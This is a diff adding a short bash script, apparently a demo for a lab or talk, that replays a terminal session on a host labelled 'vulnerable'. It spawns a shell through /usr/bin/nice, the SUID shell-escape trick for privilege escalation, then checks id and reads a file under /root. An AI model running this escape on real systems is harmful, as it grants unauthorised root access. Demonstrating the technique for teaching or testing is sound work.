@@ -1,0 +1,19 @@
+#!/bin/bash
+
+echo -n "vulnerable:1> "
+sleep 1
+echo "ls -la /usr/bin/nice" | pv -qL 10 
+ls -la /usr/bin/nice
+echo -n "vulnerable:1> "
+sleep 1
+echo "/usr/bin/nice /bin/sh" | pv -qL 10 
+/usr/bin/nice /bin/sh
+echo -n "vulnerable:1> "
+sleep 1
+echo "id" | pv -qL 10 
+id
+echo -n "vulnerable:1> "
+sleep 1
+echo "cat /root/html/index.html" | pv -qL 10 
+cat /root/html/index.html
+exit
